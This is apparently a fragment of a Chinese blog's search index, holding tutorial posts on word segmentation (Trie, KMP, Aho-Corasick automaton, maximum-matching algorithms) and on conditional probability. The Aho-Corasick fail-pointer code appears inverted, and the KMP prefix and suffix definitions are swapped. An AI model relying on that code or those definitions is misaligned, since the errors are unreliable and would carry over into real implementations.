因为匹配失败的位置是在第五位，那么获取部分匹配表中的值应该位前一位的值，通过查询下图得到数值2，然后匹配成功的字符数量为4，最后相减得到2。\n从上面得到数值后，就可以将搜索词当前开始的位置加2，因为此时的搜索词开始的位置是文本的第1位，那么加上后得到3，就意味着搜索词的第一位对应着文本的第三位：\n而通过KMP的算法就可以跳过对应普通查找方法的第二次匹配，这在大量的文本搜索当中提升是非常显著的，但是怎么来计算部分匹配表的中的值？ 部分匹配表指的是最长相同字符的长度，要计算部分匹配表首先需要知道前缀和后缀的概念，前缀指的是除了字符串第一个字符之外的所有字符串头部集合，而后缀指的是除了字符串最后一个字符之外的所有后部集合。 比如说单词home，其前后缀集合为：\n前缀集合为：{h, ho, hom} 后缀集合为：{ome, me, e} 而部分匹配表需要对每一位进行计算相应的值，而在搜索词的每一位取的范围字符为前面所有字符，比如ABABC，计算第一位因为前面没有字符，所以取的范围仅为A。到第二位则包含前面所有字符，所以等于AB。第三位则为ABA以此类推 再回到上面例子中，搜索词ABABC，其计算部分匹配表的过程为：\nA：前后缀都为空，则值为0 AB：前缀为{A},后缀为{B},没有相同的字符，部分匹配表中的值为0 ABA：前缀为{A, AB},后缀为{BA, A}，其中有字符A交集，其长度为1，部分匹配表中的值为1 ABAB：前缀为{A,AB,ABA},后缀为{BAB,AB,B}，有相同字符AB，长度为2，部分匹配表中的值为2 ABABC：前缀为{A,AB,ABA,ABAB},后缀为{BABC,ABC,BC,C}，没有相同字符，部分匹配表中的值为0 AC自动机 AC自动机(Aho-Corasick automaton)是一种基于Trie树进行匹配的一种字符串搜索算法，在1975年由Alfred V. Aho和Margaret J.Corasick发明，该算法其实和KMP算法并无太大的关联，KMP算法是1对1（一个搜索词匹配一个文本）进行搜索，而AC自动机则是1对多（多个搜索词匹配一个文本）进行搜索。 AC自动机对比Trie树的优点在于Trie树每次匹配后进行下一个字符查找的时候都需要回到顶点继续再搜索，而AC自动机则是将该文本中的字符串搜索一次性完成。 AC自动机核心是利用一个叫fail指针(失败指针)的东西，fail指针主要的用途是如果当前字符在当前节点的子元素中没有找到，那么就利用fail指针指向另外一个节点继续搜索，直到搜索完成，下图中的红线就是一个fail指针。\n比如单词列表为['he', 'hers', 'his', 'she']，待分词文本为hershe，正常Trie匹配为先找到he，然后字符r再从0开始匹配，此时r没有在顶层节点的子节点当中，所以跳过，继续查找，直到找到了she完成。 而AC自动机的算法则为当找到了he单词后，继续在当前节点的子节点当中搜索字符r，如果有继续搜索下一个字符s，然后得到单词信息hers，然后继续搜索字符h，此时搜索位置为下图红色节点位置，但该节点下没有h：\n这个时候就查看当前节点（即红色节点）的fail指针(红线)指向的节点下是否有字符h，此时发现有，则通过fail指针继续查找，直到找到了单词she。 AC自动机的理念是比较好理解，而难点在于如何计算fail指针指向谁，计算fail指针可以通过BFS（层次遍历），BFS将Trie每一层进行遍历，遍历的时候将计算所有子节点的fail指针，并将子节点放入到一个先进先出容器当中（队列）便于访问子节点的子节点。 而计算fail指针的时候一定是当前字符不存在于当前节点的子节点当中，所以查找当前节点的子节点的fail指针的时候，可以通过将当前节点的子节点中的所有fail指针都可以获取到所有父节点的fail指针，然后一层一层的找，如果找到后就指向谁，如果没有找到则指向最顶层。 下面是实现的代码：\nclass TrieNode(object): def __init__(self) -\u0026gt; None: self._children = {} self._fail = None self._exist = [] def _add_child(self, char, value, overwrite = None): child = self._children.get(char) if child is None: child = TrieNode() self._children[char] = child if overwrite: child._exist.append(value) return child class Trie(TrieNode): def __init__(self) -\u0026gt; None: super().__init__() def _find_text(self, text): state = self cut_word = [] for i,t in enumerate(text): while state._children.get(t) is None and state._fail: state = state._fail if state._children.get(t) is None: continue state = state._children.get(t) if len(state._exist) != 0: for x in state._exist: max_cut = text[i - x + 1:i + 1] cut_word.append(max_cut) return cut_word def __setitem__(self, key, value): state = self for char in key: if char == key[-1] : state = state._add_child(char, len(value), True) break state = state._add_child(char, None, False) def _init_fail(self): q = queue.Queue() for i in self._children: state = self._children.get(i) state._fail = self q.put(state) while q.empty() == False: state = q.get() for i in state._children: v = state._children.get(i) fafail = state._fail while fafail is not None and fafail._children.get(i) is not None: fafail = fafail._children.get(i) v._fail = fafail if v._fail: if len(fafail._exist) != 0: v._exist.extend(v._fail._exist) q.put(v) 参考文档 如何更好地理解和掌握 KMP 算法? KMP算法-维基百科 字符串匹配的KMP算法\n","permalink":"/posts/chinesecutwords-2/","summary":"Trie树 在上一篇文章当中，说到了一些匹配的算法，但是算法有了，还得需要一个高效的数据结构，不能只是通过[\u0026lsquo;中国人\u0026rsquo;, \u0026lsquo;中东人\u0026rsquo;]等结构来进行存放，可以想象一下，如果有几十万的词，那么这个列表的占用的内存非常大。 Trie树，也被称为前缀树，该词源自单词retrieval，发音和try相同，Trie树可为词库提供一种高效的分词数据结构，该结构本质上是一种树状数据结构，比如\u0026quot;中国人\u0026quot;、\u0026ldquo;中东人\u0026quot;三个字符串构造的Trie树为下图，图中能够很清楚的看见，Trie树结构能够很好的节省相同前缀单词所浪费的空间，因为这两个词都是以\u0026quot;中\u0026quot;开头，所以可以使用同一个父辈节点。\n除此之外，Trie树还对查询的速度有一定的优化，如果以列表存放词来说，如果列表存放的词达到了20万个，那么最坏的情况是你需要匹配的词在存放于列表最后，那么就相当于要将这20万个词全部遍历，可想而知浪费了非常多的计算资源。 而Trie查询的次数最大的次数取决于查找的字符串长度，比如中国人，那么查询次数最大仅为3次。 下图为基于同一份10万左右的词典，待分词文本为字符长度150，使用正向最大匹配算法在列表和Trie两种结构上进行分词的运行时间，从下图可以看出来差距非常大。\nTrie树的查找方式则是通过层层查询，而不是直接遍历词典，比如\u0026quot;中国人\u0026rdquo;，首先会查找第一层中是否有\u0026quot;中\u0026quot;这个字符，如果没有查询到则返回查询失败，如果有则继续查找\u0026quot;中\u0026quot;字符对应的下一层是否有\u0026quot;国\u0026quot;，如果没有则返回查询识别，如果有则继续查找\u0026quot;国\u0026quot;下一层是否有\u0026quot;人\u0026quot;，此时找到存在\u0026quot;人\u0026quot;这个节点，并且该节点标注为蓝色，表明是一个词，所以返回该字符串为一个词。 其实要实现这样的数据结构，大致的功能点为下面两点：\n查询词 添加词 除此之外还需要考虑如果标记词的结束节点，首先可以约定，默认情况都返回\u0026quot;False\u0026quot;表示为未查询到或设置失败，而返回\u0026quot;True\u0026quot;则表示查询到或设置成功，每个节点为一个字符，而字典当中的__value表示是否为结束节点（即一个词的尾字符），如果是则为True，不是则为False，整体可以采用函数或者类来定义。 实现代码：\nclass Trie(): #定义一个Trie类型 def __init__(self): #为这个生成的实例定义一个名为_children的对象，用于存放词的Trie结构 self._children = {} def _add_word(self, word): # 定义一个添加词的实例方法 child = self._children # 首先会将_children的对象赋值给child for i,char in enumerate(word): # 然后从头遍历添加词的每一个字符 if char not in child: # 查看当前字符是否存在Trie树上 child[char] = {\u0026#39;__value\u0026#39;: False} # 如果没有则新建一个对象，并设置特殊key__value为False，表明这不是一个结尾字符 if i == (len(word) - 1): # 判断是否为结尾字符 child[char][\u0026#39;__value\u0026#39;] = True # 如果是则将特殊key：__value设为True，表明为结尾字符 child = child[char] # 如果还有字符，则将当前字符对象更新为child，那么下一次查找则是基于上一次对象下 return True # 添加完成返回True def _get_word(self, word): # 查找词 child = self.","title":"(二)漫话中文分词：Trie、KMP、AC自动机"},{"content":"中文分词是指将文本拆分为单词的过程，而结果集合连接起来是等于原始的文本，而中文分词一直作为NLP领域的比较重要的领域，而大多数的文本挖掘都是以分词为基础，但中文不同于英文，英文每个单词是用空格分隔，整体语义上相对于中文难度低很多。 而业务上一直有中文分词的需求，但是之前因为在忙于另外一个项目，所以一直没有研究。 近期稍空闲开始研究了相关的中文分词算法，发现中文分词总体算比较成熟，但是其中对于未登录词或者某个特定专业领域文本大部分算法分词的结果不尽人意，需要结合多种算法或者人工词典才能达到稍微好一点的效果。 中文分词的方式一共有两种，分别为：\n词典分词：如正向最大匹配算法、反向最大匹配算法、双向最大匹配算法、最少词数法等 字标注分词：如HMM（隐马尔可夫）模型等 而这几种方式很难说出谁好谁坏，比如词典分词的方式速度非常快，但对于未登录词的识别又不太好，而HMM和Pkuseg都能识别部分未登录词，但是运行速度又降下来了，这对于在实际应用场景当中是非常致命的问题，所以最大的优解就是集各家所长，比如结巴分词就使用了词典分词算法识别能识别的词，而不能识别的则继续使用了HMM模型来处理。\n词典分词 基于词典的分词算法实际上就是对于类似字典的数据结构进行查询，对于未在词典内的词识别较弱和交集型歧义理解能力也较弱，比如“结婚的和尚未结婚的”，理想的情况是\u0026quot;结婚/的/和/尚未/结婚/的\u0026quot;，而实际中则会被分词为\u0026quot;结婚/的/和尚/未/结婚/的\u0026quot;。 但好在词典分词的速度则非常快，词典分词目前已有非常成熟高效的解决方案，并且有非常多的工具来帮你实现相关的高效数据结构和查询方式，比如Trie树和AC自动机，但在这里为了方便理解和记录，只采用了尽可能简单的方式来记录其几种算法的实现和原理。\n正向最大匹配算法（Forward Maximum Matching） 正向最大匹配算法类似于人的阅读习惯，即从左到右进行识别，而其中的\u0026quot;最大\u0026quot;是基于词典中最长字符的长度作为最大的匹配宽度，然后每次根据这个宽度对文本进行切分并取出来查询词典。如果当前取出来的词能在词典当中查询当则返回，并下一次切分的开始位置为该词的位置+1。而如果当前取出的部分没有在词典中查找到，则将该部分去掉最后一个字符后再进行查找，一直重复直到匹配到了词典中的词。如果整个部分只剩余一个字符，并没有匹配到词典中的词，则将最后剩余的这个字符输出，然后根据这个字符的位置+1开始再次进行切分和查询。 比如，有一段文本\u0026quot;中文分词算法\u0026quot;，字典中只包含了一个词\u0026quot;分词\u0026quot;，这个时候最大的匹配宽度也为2，所以整段文本按照2个字符进行切分。第一次得到\u0026quot;中文\u0026quot;文本，查找词典并无该词，则在该部分上去掉最后的字符，得到\u0026quot;中\u0026quot;，再次查询词典并无该词，此时查找结束，所以不需要再进行匹配，则这个切分记为[\u0026ldquo;中\u0026rdquo;]。 继续进行第二次切分，得到的文本为\u0026quot;文分\u0026quot;，进行查询词典，第一次查询\u0026quot;文分\u0026quot;在字典中不存在，去掉最后一个字符，继续以剩余部分\u0026rsquo;文\u0026rsquo;查询第二次，未查询到，那么返回最后这个字符\u0026quot;文\u0026quot;，加上次的结果记作[\u0026ldquo;中\u0026rdquo;,\u0026ldquo;文\u0026rdquo;] 继续第三次切分，得到文本\u0026quot;分词\u0026quot;，进行查询词典，查询到该词在字典当中，所以直接记录在之前的结果当中，记作[\u0026ldquo;中\u0026rdquo;, \u0026ldquo;文\u0026rdquo;, \u0026ldquo;分词\u0026rdquo;]。 继续第四次切分，得到文本\u0026quot;算法\u0026quot;，进行查询字典，第一次查询\u0026quot;算法\u0026quot;在字典中不存在，去掉最后一个字符，继续以剩余部分\u0026rsquo;算\u0026rsquo;查询第二次，未查询到，那么返回最后这个字符\u0026quot;算\u0026quot;，加上次的结果记作[\u0026ldquo;中\u0026rdquo;, \u0026ldquo;文\u0026rdquo;, \u0026ldquo;分词\u0026rdquo;, \u0026ldquo;算\u0026rdquo;] 继续第五次切分，因为最后只剩余一个字符，所以这个时候可以不进行匹配即返回，所以最终的结果为[\u0026ldquo;中\u0026rdquo;, \u0026ldquo;文\u0026rdquo;, \u0026ldquo;分词\u0026rdquo;, \u0026ldquo;算\u0026rdquo;, \u0026ldquo;法\u0026rdquo;] 整体分词的过程本质对每个分块进行查找，并依次去掉最后字符查询，而网上还有一部分是没有使用最大宽度切分，即会对每个字符到文本结束的位置都会依次遍历，这样的方式实际上会浪费较多的资源，因为即使从头到尾依次遍历匹配，但最长词的长度是固定的，所以真正开始匹配还是从最长词的长度开始，而其余的遍历都是浪费了资源。 正向最大匹配算法具体的实现代码：\nsentence = \u0026#39;中文分词算法\u0026#39; # 输入的句子 cutList = [\u0026#39;分词\u0026#39;] # 分词词典 start = 0 #设置切分起始位置 maxWidth = len(max(cutList, key=len)) # 得到字典当中最大的切分宽度 cut_result = [] # 设置一个空的分词结果 while (start \u0026lt;= len(sentence)): #开始循环，如果start大于等于句子长度则停止分词 end = start + maxWidth # 计算每次切分的停止位置 word = sentence[start: end] # 开始切分，文本为变量start和end的区间内字符 while ( word ) : # python对于空字符串会转换为False if ( word in cutList ) : # 查看第一次切分后是否能在词典中匹配，如果匹配则放入最终的分词结果列表cut_result,并跳出循环 cut_result.append(word) start = start + len(word) - 1 # 然后将开始位置设置为当前开始位置加上被匹配词的长度 break if (len(word[:-1]) == 0): cut_result.append(word) # 如果最后一个字符也没有被匹配到，那么返回最后一个字符 break word = word[:-1] # 将word去掉最后一个字符串并重新计算 start = start + 1 # 将位置加1 print(cut_result) #[\u0026#39;中\u0026#39;, \u0026#39;文\u0026#39;, \u0026#39;分词\u0026#39;, \u0026#39;算\u0026#39;, \u0026#39;法\u0026#39;] 反向最大匹配算法（Backward Maximum Matching） 反向最大匹配算法与正向最大匹配算法是相反的，比如\u0026quot;中文分词算法\u0026quot;文本的正向最大匹配算法在切分宽度为2的时候，是从\u0026quot;中文\u0026quot;开始切分的，而反向则是从\u0026quot;算法\u0026quot;开始切分的。 除了反向的切分，其中对于切分块内的文本依次去掉最后一个字符也变为了依次去掉第一个字符，比如正向第一个切分块\u0026quot;中文\u0026quot;后，如果没有匹配到，则去掉\u0026quot;文\u0026quot;，再对\u0026quot;中\u0026quot;字符进行匹配，而反向则是拿到\u0026quot;算法\u0026quot;后，如果没有匹配到，则是去掉\u0026quot;算\u0026quot;，再对\u0026quot;法\u0026quot;进行匹配。 反向最大匹配算法对比于正向最大匹配算法来说，可以解决一定的交集型歧义，比如本文\u0026quot;他说的确实在理\u0026quot;，理想情况下希望的分词结果中包含\u0026quot;确实\u0026quot;这一词，而正向最大匹配算法结果为\u0026quot;他/说/的确/实/在理\u0026quot;，而反向最大匹配算法的结果为\u0026quot;他/说/的/确实/在理\u0026quot;。 这两种方式很难区分到底谁好谁坏，比如上面的问题中，如果你希望的分词为\u0026quot;的确\u0026quot;，但是如果使用反向的话就很难被分出来。 反向最大匹配算法具体的实现代码：\nsentence = \u0026#39;他说的确实在理\u0026#39; # 输入的句子 cutList = [\u0026#39;的确\u0026#39;, \u0026#39;确实\u0026#39;] # 分词词典 start = len(sentence) #设置切分起始位置为该文本的最后一个字符 maxWidth = len(max(cutList, key=len)) # 得到字典当中最大的切分宽度 cut_result = [] # 设置一个空的分词结果 while (start \u0026gt; 0): #开始循环，如果start大于等于句子长度则停止分词 end = start - maxWidth # 计算结束位置，结束位置为开始位置减去宽度 word = sentence[end: start] # 开始切分，文本为变量end和start的区间内字符 while ( word ) : # python对于空字符串会转换为False if ( word in cutList ) : # 查看第一次切分后是否能在词典中匹配，如果匹配则放入最终的分词结果列表cut_result,并跳出循环 cut_result.insert(0,word) start = start - len(word) + 1 # 然后将开始位置设置为当前开始位置加上被匹配词的长度 break if (len(word) == 1): cut_result.insert(0, word) # 返回最后一个字符 break word = word[1:] # 将word去掉第一个字符串并重新计算 start = start - 1 # 将位置减1 cut_result.insert(0, sentence[0]) # 将剩余的第一个字符添加进结果 print(cut_result) #[\u0026#39;他\u0026#39;, \u0026#39;说\u0026#39;, \u0026#39;的\u0026#39;, \u0026#39;确实\u0026#39;, \u0026#39;在\u0026#39;, \u0026#39;理\u0026#39;] 双向最大匹配算法（Bidirectional Maximum Match） 双向最大匹配算法是将正向和反向结果的颗粒度进行比较的一种算法，本质上是一种规则系统，该规则为如下：\n返回词数最少的结果 返回单字词更少的结果 如果两则都相同优先返回反向最大匹配算法结果 因为双向最大匹配算法实际上是一种规则系统，只需要对结果进行判断优先返回哪种结果，所以这里就不过多的说明。但需要注意的是采用双向最大匹配算法实际上运行了两种算法，所以对于运算量来说是双倍。\n最少词数算法（Minimal Word Count） 最少词数算法也被称为最少切分算法，最少词数算法的本质是将一段文本分词的结果最少，最少次数算法整个过程是将字典按照长度进行排序，首先对最长的字典中的词进行匹配字符串，如果有则切分，并继续匹配下一个字典中的词，如果没有则继续匹配按照顺序匹配。 比如\u0026quot;独立自主和平等互利的原则\u0026quot;，正向匹配的结果为\u0026quot;独立自主/和平/等/互利/的/原则\u0026quot;，而最少词数的结果\u0026quot;独立自主/和/平等互利/的/原则\u0026quot;。 下面为一个非常简单的实现：\nsentence = \u0026#39;独立自主和平等互利的原则\u0026#39; # 输入的句子 cutList = [\u0026#39;独立自主\u0026#39;, \u0026#39;平等互利\u0026#39;, \u0026#39;独立\u0026#39;, \u0026#39;自主\u0026#39;, \u0026#39;和平\u0026#39;, \u0026#39;平等\u0026#39;, \u0026#39;互利\u0026#39;, \u0026#39;原则\u0026#39;] # 分词词典 cutList = sorted(cutList, key=len, reverse=True) # 字典排序 for cut in cutList: if(\u0026#39;/%s\u0026#39;%cut not in sentence and \u0026#39;%s/\u0026#39;%cut not in sentence and cut in sentence) : sentence = sentence.replace(cut, \u0026#39;/%s/\u0026#39;%cut) print(sentence) #/独立自主/和/平等互利/的/原则 参考文档 https://www.cnblogs.com/cyandn/p/10891608.html https://zhuanlan.zhihu.com/p/103392455 http://www.matrix67.com/blog/archives/4212 https://kexue.fm/archives/3908 ","permalink":"/posts/chinesecutwords-1/","summary":"中文分词是指将文本拆分为单词的过程，而结果集合连接起来是等于原始的文本，而中文分词一直作为NLP领域的比较重要的领域，而大多数的文本挖掘都是以分词为基础，但中文不同于英文，英文每个单词是用空格分隔，整体语义上相对于中文难度低很多。 而业务上一直有中文分词的需求，但是之前因为在忙于另外一个项目，所以一直没有研究。 近期稍空闲开始研究了相关的中文分词算法，发现中文分词总体算比较成熟，但是其中对于未登录词或者某个特定专业领域文本大部分算法分词的结果不尽人意，需要结合多种算法或者人工词典才能达到稍微好一点的效果。 中文分词的方式一共有两种，分别为：\n词典分词：如正向最大匹配算法、反向最大匹配算法、双向最大匹配算法、最少词数法等 字标注分词：如HMM（隐马尔可夫）模型等 而这几种方式很难说出谁好谁坏，比如词典分词的方式速度非常快，但对于未登录词的识别又不太好，而HMM和Pkuseg都能识别部分未登录词，但是运行速度又降下来了，这对于在实际应用场景当中是非常致命的问题，所以最大的优解就是集各家所长，比如结巴分词就使用了词典分词算法识别能识别的词，而不能识别的则继续使用了HMM模型来处理。\n词典分词 基于词典的分词算法实际上就是对于类似字典的数据结构进行查询，对于未在词典内的词识别较弱和交集型歧义理解能力也较弱，比如“结婚的和尚未结婚的”，理想的情况是\u0026quot;结婚/的/和/尚未/结婚/的\u0026quot;，而实际中则会被分词为\u0026quot;结婚/的/和尚/未/结婚/的\u0026quot;。 但好在词典分词的速度则非常快，词典分词目前已有非常成熟高效的解决方案，并且有非常多的工具来帮你实现相关的高效数据结构和查询方式，比如Trie树和AC自动机，但在这里为了方便理解和记录，只采用了尽可能简单的方式来记录其几种算法的实现和原理。\n正向最大匹配算法（Forward Maximum Matching） 正向最大匹配算法类似于人的阅读习惯，即从左到右进行识别，而其中的\u0026quot;最大\u0026quot;是基于词典中最长字符的长度作为最大的匹配宽度，然后每次根据这个宽度对文本进行切分并取出来查询词典。如果当前取出来的词能在词典当中查询当则返回，并下一次切分的开始位置为该词的位置+1。而如果当前取出的部分没有在词典中查找到，则将该部分去掉最后一个字符后再进行查找，一直重复直到匹配到了词典中的词。如果整个部分只剩余一个字符，并没有匹配到词典中的词，则将最后剩余的这个字符输出，然后根据这个字符的位置+1开始再次进行切分和查询。 比如，有一段文本\u0026quot;中文分词算法\u0026quot;，字典中只包含了一个词\u0026quot;分词\u0026quot;，这个时候最大的匹配宽度也为2，所以整段文本按照2个字符进行切分。第一次得到\u0026quot;中文\u0026quot;文本，查找词典并无该词，则在该部分上去掉最后的字符，得到\u0026quot;中\u0026quot;，再次查询词典并无该词，此时查找结束，所以不需要再进行匹配，则这个切分记为[\u0026ldquo;中\u0026rdquo;]。 继续进行第二次切分，得到的文本为\u0026quot;文分\u0026quot;，进行查询词典，第一次查询\u0026quot;文分\u0026quot;在字典中不存在，去掉最后一个字符，继续以剩余部分\u0026rsquo;文\u0026rsquo;查询第二次，未查询到，那么返回最后这个字符\u0026quot;文\u0026quot;，加上次的结果记作[\u0026ldquo;中\u0026rdquo;,\u0026ldquo;文\u0026rdquo;] 继续第三次切分，得到文本\u0026quot;分词\u0026quot;，进行查询词典，查询到该词在字典当中，所以直接记录在之前的结果当中，记作[\u0026ldquo;中\u0026rdquo;, \u0026ldquo;文\u0026rdquo;, \u0026ldquo;分词\u0026rdquo;]。 继续第四次切分，得到文本\u0026quot;算法\u0026quot;，进行查询字典，第一次查询\u0026quot;算法\u0026quot;在字典中不存在，去掉最后一个字符，继续以剩余部分\u0026rsquo;算\u0026rsquo;查询第二次，未查询到，那么返回最后这个字符\u0026quot;算\u0026quot;，加上次的结果记作[\u0026ldquo;中\u0026rdquo;, \u0026ldquo;文\u0026rdquo;, \u0026ldquo;分词\u0026rdquo;, \u0026ldquo;算\u0026rdquo;] 继续第五次切分，因为最后只剩余一个字符，所以这个时候可以不进行匹配即返回，所以最终的结果为[\u0026ldquo;中\u0026rdquo;, \u0026ldquo;文\u0026rdquo;, \u0026ldquo;分词\u0026rdquo;, \u0026ldquo;算\u0026rdquo;, \u0026ldquo;法\u0026rdquo;] 整体分词的过程本质对每个分块进行查找，并依次去掉最后字符查询，而网上还有一部分是没有使用最大宽度切分，即会对每个字符到文本结束的位置都会依次遍历，这样的方式实际上会浪费较多的资源，因为即使从头到尾依次遍历匹配，但最长词的长度是固定的，所以真正开始匹配还是从最长词的长度开始，而其余的遍历都是浪费了资源。 正向最大匹配算法具体的实现代码：\nsentence = \u0026#39;中文分词算法\u0026#39; # 输入的句子 cutList = [\u0026#39;分词\u0026#39;] # 分词词典 start = 0 #设置切分起始位置 maxWidth = len(max(cutList, key=len)) # 得到字典当中最大的切分宽度 cut_result = [] # 设置一个空的分词结果 while (start \u0026lt;= len(sentence)): #开始循环，如果start大于等于句子长度则停止分词 end = start + maxWidth # 计算每次切分的停止位置 word = sentence[start: end] # 开始切分，文本为变量start和end的区间内字符 while ( word ) : # python对于空字符串会转换为False if ( word in cutList ) : # 查看第一次切分后是否能在词典中匹配，如果匹配则放入最终的分词结果列表cut_result,并跳出循环 cut_result.","title":"(一)漫话中文分词：最大匹配,双向最大,最小词数"},{"content":"样本空间（Ω） 样本空间通常指实验或随机所有可能的集合，我们常在说一个概率的时候，实际上是默认忽略掉了样本空间，比如说事件A的概率，实际上指样本空间中，事件A的数量与样本空间的占比。\n比如丢硬币，硬币只有正面和反面，那么硬币的样本空间则为 ${正面，反面}$，这个时候常说的正面的概率为二分之一，实际指的是正面事件的数量与样本空间的占比，也就是1/2。 再比如说丢骰子，一个骰子有6种可能，分别对应1-6不同的数值，那么丢骰子的样本空间则为${1，2，3，4，5，6}$，这个时候丢到5个事件概率则为数字5在样本空间出现的次数与样本空间总数的占比。\n独立事件 独立事件是指不受过去已发生的事件而影响的事件，典型的例子就是抛硬币，不管你抛多少次硬币始终正面或反面的概率为0.5，而该硬币的样本空间如下：\n独立事件的概率计算公式为如下：\n$$ 事件发生的概率(P) = 事件在样本空间中的数量 / 样本空间的事件总数 $$\n比如用抛硬币的例子，计算正面的概率则为：\n而除了单个独立事件，有些时候也会求多个独立事件的概率，而多个独立事件的概率则是每个独立事件发生的概率的积。 比如掷3次骰子都为6的概率是多少？需要注意因为掷骰子是一个独立事件，即每次掷的骰子样本空间都一样，并且没有因为第一次掷骰子的结果会影响到下一次。 骰子的样本空间为下，从中能够得到单次掷骰子为6的概率为1/6：\n而这个时候只需要将三次掷骰子的概率相乘就得到了三次都为6的概率：\n相关事件 相关事件和独立事件是相对的，相关事件的发生概率会受到过去已发生事件的影响，每个事件都和上一个事件有关联，这些事件便是相关的。 比如一个布袋中有5个球，其中包含2个蓝球，三个红球，布袋(样本空间)则为：\n这个时候如果随机拿一颗蓝球的概率是多少？概率为2/5。 但是此时求第二次拿到蓝球的概率是多少？这个时候就会有两种情况发生：\n第一次拿到红球，这个时候整个样本空间少了一个红球，所以第二次拿到蓝球的概率为2/4 第二次拿到蓝球，这个时候整个样本空间少了一个篮球，所以第二次拿到蓝球的概率为1/4 用图表示则为：\n所以此时，如果算第一次拿到红球后，第二次拿到蓝球的概率则为：\n如果算第一次拿到蓝球后，第二次拿到红球的概率则为：\n条件概率 条件概率是研究相关事件的，指的是当B事件发生后，A事件发生的概率，用\u0026quot;｜\u0026quot;来表示\u0026quot;以下发生的条件下\u0026quot;，表示为公式：\n比如上面的例子，第二个蓝球的概率是多少，这个问题就是条件概率，因为第二次抽中蓝球的概率是基于第一次拿了一颗球过后发生的事件。 这个时候可以将第一次抽中红球记作事件A，第二次抽蓝球为事件B，因为第二次抽球是在事件A发生的情况下而发生的，所以记作 $P(B|A)$ ，表示在A发生后，B发生的概率。 而这个概率可以根据下图来得到，即2/4：\n这里的条件概率本质是二级概率，该情况可以用图来表达，第一次抽球的样本空间为整个样本空间：\n当第一次抽球(A事件)发生后，B事件的样本空间则是基于A事件发生后的样本空间，即下图中A圆圈内的样本空间：\n联合概率 联合概率指两个事件共同发生的概率，比如A和B事件共同发生的概率表示为：\n联合概率的计算分为两种情况，一种为独立事件，比如前面掷骰子，计算公式则为多个独立事件事件的积，表示为：\n另一种则为相关事件，比如上面的抽球的例子，则可以通过反推来计算，表示为：\n这里这样计算是因为P(B|A)只得到了B在A发生后的概率，也就是在发生后的样本空间上计算的，所以P(B|A)表示的只有下图这么一部分发生的概率：\n而在这个时候乘以P(A)的概率，则就能表示如下这整个部分：\n全概率 导致一个事件发生的原因有很多种，那么该事件发生的概率就是每种原因引起该事件发生的概率总和，这句话能够很好的解释全概率。 而全概率公式就可以计算出一个事件的全部概率，公式为：\n而根据联合概率的计算方法，可以写成下面这样：\n还是拿红蓝球的例子来说，如果需要计算P(B)，这个时候可以利用全概率公式，则将能引起事件B发生的每个概率相加，即可得到P(B)。 在红篮球例子当中，引起事件B的原因有两种，分别为：先拿到红球，然后抽中蓝球的概率和先拿到蓝球抽中蓝球的概率。 根据图中第一种先拿到了红球引起B事件的发生的概率为 $(3/5) * (2/4) = 0.3$\n根据图中第二种先拿到了蓝球引起B事件的发生的概率为 $(2/5) * (1/4) = 0.1 $\n这个时候得到了所有能引起B事件发生的原因的概率，所以：\n$$ P(B) = 0.3 + 0.1 = 0.4 $$\n条件概率和朴素贝叶斯定理公式 在理解了上面的几个知识点后，就能够理解贝叶斯和条件概率的计算方式。 条件概率的计算公式为：\n而贝叶斯公式则可以用条件概率公式和联合概率公式推导出来：\n参考文档 https://zhuanlan.zhihu.com/p/134036707 https://blog.csdn.net/u013371163/article/details/60469065 https://www.shuxuele.com/data/probability-events-conditional.html https://www.shuxuele.com/data/probability-events-independent.html https://www.shuxuele.com/data/probability-events-types.html https://www.zhihu.com/question/264373830/answer/613608291 https://blog.csdn.net/u013371163/article/details/60469065 https://zhuanlan.zhihu.com/p/78297343 ","permalink":"/posts/learning-conditional-probability/","summary":"样本空间（Ω） 样本空间通常指实验或随机所有可能的集合，我们常在说一个概率的时候，实际上是默认忽略掉了样本空间，比如说事件A的概率，实际上指样本空间中，事件A的数量与样本空间的占比。\n比如丢硬币，硬币只有正面和反面，那么硬币的样本空间则为 ${正面，反面}$，这个时候常说的正面的概率为二分之一，实际指的是正面事件的数量与样本空间的占比，也就是1/2。 再比如说丢骰子，一个骰子有6种可能，分别对应1-6不同的数值，那么丢骰子的样本空间则为${1，2，3，4，5，6}$，这个时候丢到5个事件概率则为数字5在样本空间出现的次数与样本空间总数的占比。\n独立事件 独立事件是指不受过去已发生的事件而影响的事件，典型的例子就是抛硬币，不管你抛多少次硬币始终正面或反面的概率为0.5，而该硬币的样本空间如下：\n独立事件的概率计算公式为如下：\n$$ 事件发生的概率(P) = 事件在样本空间中的数量 / 样本空间的事件总数 $$\n比如用抛硬币的例子，计算正面的概率则为：\n而除了单个独立事件，有些时候也会求多个独立事件的概率，而多个独立事件的概率则是每个独立事件发生的概率的积。 比如掷3次骰子都为6的概率是多少？需要注意因为掷骰子是一个独立事件，即每次掷的骰子样本空间都一样，并且没有因为第一次掷骰子的结果会影响到下一次。 骰子的样本空间为下，从中能够得到单次掷骰子为6的概率为1/6：\n而这个时候只需要将三次掷骰子的概率相乘就得到了三次都为6的概率：\n相关事件 相关事件和独立事件是相对的，相关事件的发生概率会受到过去已发生事件的影响，每个事件都和上一个事件有关联，这些事件便是相关的。 比如一个布袋中有5个球，其中包含2个蓝球，三个红球，布袋(样本空间)则为：\n这个时候如果随机拿一颗蓝球的概率是多少？概率为2/5。 但是此时求第二次拿到蓝球的概率是多少？这个时候就会有两种情况发生：\n第一次拿到红球，这个时候整个样本空间少了一个红球，所以第二次拿到蓝球的概率为2/4 第二次拿到蓝球，这个时候整个样本空间少了一个篮球，所以第二次拿到蓝球的概率为1/4 用图表示则为：\n所以此时，如果算第一次拿到红球后，第二次拿到蓝球的概率则为：\n如果算第一次拿到蓝球后，第二次拿到红球的概率则为：\n条件概率 条件概率是研究相关事件的，指的是当B事件发生后，A事件发生的概率，用\u0026quot;｜\u0026quot;来表示\u0026quot;以下发生的条件下\u0026quot;，表示为公式：\n比如上面的例子，第二个蓝球的概率是多少，这个问题就是条件概率，因为第二次抽中蓝球的概率是基于第一次拿了一颗球过后发生的事件。 这个时候可以将第一次抽中红球记作事件A，第二次抽蓝球为事件B，因为第二次抽球是在事件A发生的情况下而发生的，所以记作 $P(B|A)$ ，表示在A发生后，B发生的概率。 而这个概率可以根据下图来得到，即2/4：\n这里的条件概率本质是二级概率，该情况可以用图来表达，第一次抽球的样本空间为整个样本空间：\n当第一次抽球(A事件)发生后，B事件的样本空间则是基于A事件发生后的样本空间，即下图中A圆圈内的样本空间：\n联合概率 